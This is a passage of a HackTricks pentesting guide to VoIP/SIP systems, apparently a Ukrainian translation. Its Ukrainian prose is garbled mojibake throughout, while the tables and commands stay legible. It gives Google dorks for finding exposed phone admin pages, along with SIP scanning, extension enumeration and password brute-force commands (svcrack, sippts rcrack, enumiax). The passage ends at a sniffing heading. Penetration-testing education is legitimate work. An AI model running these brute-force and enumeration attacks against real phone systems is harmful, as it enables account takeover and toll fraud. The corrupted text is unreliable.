# Pentesting VoIP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## VoIP –û—Å–Ω–æ–≤–Ω–∞ –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–©–æ–± –ø–æ—á–∞—Ç–∏ –≤–∏–≤—á–∞—Ç–∏, —è–∫ –ø—Ä–∞—Ü—é—î VoIP, –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## –û—Å–Ω–æ–≤–Ω—ñ –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Response Codes

**1xx‚Äî–ü—Ä–æ–º—ñ–∂–Ω—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx‚Äî–£—Å–ø—ñ—à–Ω—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ**
```
200 OK
202 Accepted
204 No Notification
```
**3xx‚Äî–í—ñ–¥–ø–æ–≤—ñ–¥—ñ –Ω–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx‚Äî–í—ñ–¥–ø–æ–≤—ñ–¥—ñ –ø—Ä–æ –ø–æ–º–∏–ª–∫–∏ –∫–ª—ñ—î–Ω—Ç–∞**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx‚Äî–í—ñ–¥–ø–æ–≤—ñ–¥—ñ –ø—Ä–æ –∑–±—ñ–π —Å–µ—Ä–≤–µ—Ä–∞**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx‚Äî–ì–ª–æ–±–∞–ª—å–Ω—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –Ω–∞ –ø–æ–º–∏–ª–∫–∏**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Telephone Numbers

–û–¥–Ω–∏–º –∑ –ø–µ—Ä—à–∏—Ö –∫—Ä–æ–∫—ñ–≤, —è–∫—ñ –º–æ–∂–µ –∑—Ä–æ–±–∏—Ç–∏ Red Team, —î –ø–æ—à—É–∫ –¥–æ—Å—Ç—É–ø–Ω–∏—Ö —Ç–µ–ª–µ—Ñ–æ–Ω–Ω–∏—Ö –Ω–æ–º–µ—Ä—ñ–≤ –¥–ª—è –∑–≤'—è–∑–∫—É –∑ –∫–æ–º–ø–∞–Ω—ñ—î—é, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ OSINT, –ø–æ—à—É–∫ –≤ Google –∞–±–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–æ–∫.

–ö–æ–ª–∏ —É –≤–∞—Å —î —Ç–µ–ª–µ—Ñ–æ–Ω–Ω—ñ –Ω–æ–º–µ—Ä–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–Ω–ª–∞–π–Ω-—Å–µ—Ä–≤—ñ—Å–∏ –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

–ó–Ω–∞—é—á–∏, —á–∏ –Ω–∞–¥–∞—î –æ–ø–µ—Ä–∞—Ç–æ—Ä –ø–æ—Å–ª—É–≥–∏ VoIP, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∑–Ω–∞—á–∏—Ç–∏, —á–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫–æ–º–ø–∞–Ω—ñ—è VoIP... –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –º–æ–∂–ª–∏–≤–æ, —â–æ –∫–æ–º–ø–∞–Ω—ñ—è –Ω–µ –Ω–∞–π–º–∞–ª–∞ –ø–æ—Å–ª—É–≥–∏ VoIP, –∞–ª–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î PSTN –∫–∞—Ä—Ç–∏ –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —Å–≤–æ–≥–æ VoIP PBX –¥–æ —Ç—Ä–∞–¥–∏—Ü—ñ–π–Ω–æ—ó —Ç–µ–ª–µ—Ñ–æ–Ω–Ω–æ—ó –º–µ—Ä–µ–∂—ñ.

–¢–∞–∫—ñ —Ä–µ—á—ñ, —è–∫ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ –º—É–∑–∏–∫–æ—é, –∑–∞–∑–≤–∏—á–∞–π –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ —Ç–µ, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–ë—É–¥—å-—è–∫–∞ —ñ–Ω—à–∞ OSINT-–µ–Ω—É–º–µ—Ä–∞—Ü—ñ—è, —è–∫–∞ –¥–æ–ø–æ–º–∞–≥–∞—î –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω–µ VoIP –ø—Ä–æ–≥—Ä–∞–º–Ω–µ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è, –±—É–¥–µ –∫–æ—Ä–∏—Å–Ω–æ—é –¥–ª—è Red Team.

### –ü–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è –º–µ—Ä–µ–∂—ñ

* **`nmap`** –∑–¥–∞—Ç–Ω–∏–π —Å–∫–∞–Ω—É–≤–∞—Ç–∏ UDP-—Å–µ—Ä–≤—ñ—Å–∏, –∞–ª–µ —á–µ—Ä–µ–∑ –≤–µ–ª–∏–∫—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å UDP-—Å–µ—Ä–≤—ñ—Å—ñ–≤, —è–∫—ñ —Å–∫–∞–Ω—É—é—Ç—å—Å—è, —Ü–µ –¥—É–∂–µ –ø–æ–≤—ñ–ª—å–Ω–æ —ñ –º–æ–∂–µ –±—É—Ç–∏ –Ω–µ –¥—É–∂–µ —Ç–æ—á–Ω–∏–º –¥–ª—è —Ç–∞–∫–æ–≥–æ —Ä–æ–¥—É —Å–µ—Ä–≤—ñ—Å—ñ–≤.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** –∑ SIPVicious (`sudo apt install sipvicious`): –ó–Ω–∞–π–¥–µ SIP-—Å–µ—Ä–≤—ñ—Å–∏ –≤ –∑–∞–∑–Ω–∞—á–µ–Ω—ñ–π –º–µ—Ä–µ–∂—ñ.
* `svmap` **–ª–µ–≥–∫–æ –∑–∞–±–ª–æ–∫—É–≤–∞—Ç–∏**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î User-Agent `friendly-scanner`, –∞–ª–µ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –∫–æ–¥ –∑ `/usr/share/sipvicious/sipvicious` —ñ –∑–º—ñ–Ω–∏—Ç–∏ –π–æ–≥–æ.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS —Å–∫–∞–Ω–µ—Ä - —Ü–µ –¥—É–∂–µ —à–≤–∏–¥–∫–∏–π —Å–∫–∞–Ω–µ—Ä –¥–ª—è SIP —Å–µ—Ä–≤—ñ—Å—ñ–≤ —á–µ—Ä–µ–∑ UDP, TCP –∞–±–æ TLS. –í—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –±–∞–≥–∞—Ç–æ–ø–æ—Ç–æ—á–Ω—ñ—Å—Ç—å —ñ –º–æ–∂–µ —Å–∫–∞–Ω—É–≤–∞—Ç–∏ –≤–µ–ª–∏–∫—ñ –¥—ñ–∞–ø–∞–∑–æ–Ω–∏ –º–µ—Ä–µ–∂. –î–æ–∑–≤–æ–ª—è—î –ª–µ–≥–∫–æ –≤–∫–∞–∑–∞—Ç–∏ –¥—ñ–∞–ø–∞–∑–æ–Ω –ø–æ—Ä—Ç—ñ–≤, —Å–∫–∞–Ω—É–≤–∞—Ç–∏ —è–∫ TCP, —Ç–∞–∫ —ñ UDP, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—à–∏–π –º–µ—Ç–æ–¥ (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ OPTIONS) —Ç–∞ –≤–∫–∞–∑—É–≤–∞—Ç–∏ —ñ–Ω—à–∏–π User-Agent (—ñ –Ω–µ —Ç—ñ–ª—å–∫–∏).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### –î–æ–¥–∞—Ç–∫–æ–≤–∞ –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ú–µ—Ä–µ–∂—ñ

PBX —Ç–∞–∫–æ–∂ –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ —ñ–Ω—à—ñ –º–µ—Ä–µ–∂–µ–≤—ñ —Å–µ—Ä–≤—ñ—Å–∏, —Ç–∞–∫—ñ —è–∫:

* **69/UDP (TFTP)**: –û–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—Ä–æ—à–∏–≤–∫–∏
* **80 (HTTP) / 443 (HTTPS)**: –î–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –ø—Ä–∏—Å—Ç—Ä–æ—î–º –∑ –≤–µ–±—É
* **389 (LDAP)**: –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
* **3306 (MySQL)**: –ë–∞–∑–∞ –¥–∞–Ω–∏—Ö MySQL
* **5038 (Manager)**: –î–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ Asterisk –∑ —ñ–Ω—à–∏—Ö –ø–ª–∞—Ç—Ñ–æ—Ä–º
* **5222 (XMPP)**: –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Jabber
* **5432 (PostgreSQL)**: –ë–∞–∑–∞ –¥–∞–Ω–∏—Ö PostgreSQL
* –Ü —ñ–Ω—à—ñ...

### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ú–µ—Ç–æ–¥—ñ–≤

–ú–æ–∂–ª–∏–≤–æ –∑–Ω–∞–π—Ç–∏ **—è–∫—ñ –º–µ—Ç–æ–¥–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ** –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤ PBX, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `SIPPTS enumerate` –∑ [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### –ê–Ω–∞–ª—ñ–∑ –≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π —Å–µ—Ä–≤–µ—Ä–∞

–î—É–∂–µ –≤–∞–∂–ª–∏–≤–æ –∞–Ω–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∏, —è–∫—ñ —Å–µ—Ä–≤–µ—Ä –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î –Ω–∞–º —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å, –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–∏–ø—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —Ç–∞ –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤, —è–∫—ñ –º–∏ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ. –ó `SIPPTS send` –∑ [**sippts**](https://github.com/Pepelux/sippts) –º–∏ –º–æ–∂–µ–º–æ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –ø–µ—Ä—Å–æ–Ω–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –º–∞–Ω—ñ–ø—É–ª—é—é—á–∏ –≤—Å—ñ–º–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏, —Ç–∞ –∞–Ω–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–∞–Ω—ñ, —è–∫—â–æ —Å–µ—Ä–≤–µ—Ä –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –≤–µ–±-—Å–æ–∫–µ—Ç–∏. –ó `SIPPTS wssend` –∑ [**sippts**](https://github.com/Pepelux/sippts) –º–∏ –º–æ–∂–µ–º–æ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –ø–µ—Ä—Å–æ–Ω–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ WS –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

–†–æ–∑—à–∏—Ä–µ–Ω–Ω—è –≤ —Å–∏—Å—Ç–µ–º—ñ PBX (–ü—Ä–∏–≤–∞—Ç–Ω–∞ –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∞ –û–±–º—ñ–Ω–Ω–∞ –°—Ç–∞–Ω—Ü—ñ—è) –≤—ñ–¥–Ω–æ—Å—è—Ç—å—Å—è –¥–æ **—É–Ω—ñ–∫–∞–ª—å–Ω–∏—Ö –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä—ñ–≤, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏—Ö –æ–∫—Ä–µ–º–∏–º** —Ç–µ–ª–µ—Ñ–æ–Ω–Ω–∏–º –ª—ñ–Ω—ñ—è–º, –ø—Ä–∏—Å—Ç—Ä–æ—è–º –∞–±–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –≤ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó —á–∏ –±—ñ–∑–Ω–µ—Å—ñ. –†–æ–∑—à–∏—Ä–µ–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—é—Ç—å **–µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –º–∞—Ä—à—Ä—É—Ç–∏–∑—É–≤–∞—Ç–∏ –¥–∑–≤—ñ–Ω–∫–∏ –≤ –º–µ–∂–∞—Ö –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó**, –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –≤ –æ–∫—Ä–µ–º–∏—Ö –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —Ç–µ–ª–µ—Ñ–æ–Ω–Ω–∏—Ö –Ω–æ–º–µ—Ä–∞—Ö –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ –ø—Ä–∏—Å—Ç—Ä–æ—é.

* **`svwar`** –∑ SIPVicious (`sudo apt install sipvicious`): `svwar` —î –±–µ–∑–∫–æ—à—Ç–æ–≤–Ω–∏–º —Å–∫–∞–Ω–µ—Ä–æ–º –ª—ñ–Ω—ñ–π —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è SIP PBX. –ó–∞ —Å–≤–æ—î—é —Å—É—Ç—Ç—é –≤—ñ–Ω –ø—Ä–∞—Ü—é—î –ø–æ–¥—ñ–±–Ω–æ –¥–æ —Ç—Ä–∞–¥–∏—Ü—ñ–π–Ω–∏—Ö –≤–æ—Ä–¥—Ä–∞–π–≤–µ—Ä—ñ–≤, **–≤–≥–∞–¥—É—é—á–∏ –¥—ñ–∞–ø–∞–∑–æ–Ω —Ä–æ–∑—à–∏—Ä–µ–Ω—å –∞–±–æ –∑–∞–¥–∞–Ω–∏–π —Å–ø–∏—Å–æ–∫ —Ä–æ–∑—à–∏—Ä–µ–Ω—å**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –Ω–∞ SIP —Å–µ—Ä–≤–µ—Ä—ñ. Sipexten –º–æ–∂–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –≤–µ–ª–∏–∫—ñ –º–µ—Ä–µ–∂—ñ —Ç–∞ –¥—ñ–∞–ø–∞–∑–æ–Ω–∏ –ø–æ—Ä—Ç—ñ–≤.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: –í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è/—ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** —î **–ø–µ—Ä–µ–±—ñ—Ä–Ω–∏–∫–æ–º —ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤** –ø—Ä–æ—Ç–æ–∫–æ–ª—É Inter Asterisk Exchange. enumIAX –º–æ–∂–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –≤ –¥–≤–æ—Ö —Ä—ñ–∑–Ω–∏—Ö —Ä–µ–∂–∏–º–∞—Ö: –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–µ –≤–≥–∞–¥—É–≤–∞–Ω–Ω—è —ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∞–±–æ –∞—Ç–∞–∫–∞ –∑–∞ —Å–ª–æ–≤–Ω–∏–∫–æ–º.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP –ê—Ç–∞–∫–∏

### Password Brute-Force - –æ–Ω–ª–∞–π–Ω

–í–∏—è–≤–∏–≤—à–∏ **PBX** —Ç–∞ –¥–µ—è–∫—ñ **—Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è/—ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤**, –ß–µ—Ä–≤–æ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ –º–æ–∂–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ –º–µ—Ç–æ–¥ `REGISTER`** –¥–æ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–ª–æ–≤–Ω–∏–∫ –∑–∞–≥–∞–ª—å–Ω–∏—Ö –ø–∞—Ä–æ–ª—ñ–≤ –¥–ª—è –±—Ä—É—Ç—Ñ–æ—Ä—Å—É –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó.

{% hint style="danger" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –º–æ–∂–µ –±—É—Ç–∏ —Ç–∞–∫–∏–º –∂–µ, —è–∫ —ñ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è, –∞–ª–µ —Ü—è –ø—Ä–∞–∫—Ç–∏–∫–∞ –º–æ–∂–µ –≤–∞—Ä—ñ—é–≤–∞—Ç–∏—Å—è –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ —Å–∏—Å—Ç–µ–º–∏ PBX, —ó—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–∞ —É–ø–æ–¥–æ–±–∞–Ω—å –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó...

–Ø–∫—â–æ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–µ —Ç–∞–∫–µ –∂, —è–∫ —ñ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ **–∑'—è—Å—É–≤–∞—Ç–∏ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è –±—Ä—É—Ç—Ñ–æ—Ä—Å—É**.
{% endhint %}

* **`svcrack`** –∑ SIPVicious (`sudo apt install sipvicious`): SVCrack –¥–æ–∑–≤–æ–ª—è—î –∑–ª–∞–º–∞—Ç–∏ –ø–∞—Ä–æ–ª—å –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞/—Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –Ω–∞ PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack - —Ü–µ –≤—ñ–¥–¥–∞–ª–µ–Ω–∏–π –∑–ª–æ–º—É–≤–∞—á –ø–∞—Ä–æ–ª—ñ–≤ –¥–ª—è SIP-—Å–µ—Ä–≤—ñ—Å—ñ–≤. Rcrack –º–æ–∂–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –ø–∞—Ä–æ–ª—ñ –¥–ª—è –∫—ñ–ª—å–∫–æ—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –Ω–∞ —Ä—ñ–∑–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å–∞—Ö —ñ –¥—ñ–∞–ø–∞–∑–æ–Ω–∞—Ö –ø–æ—Ä—Ç—ñ–≤.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP Sniffing

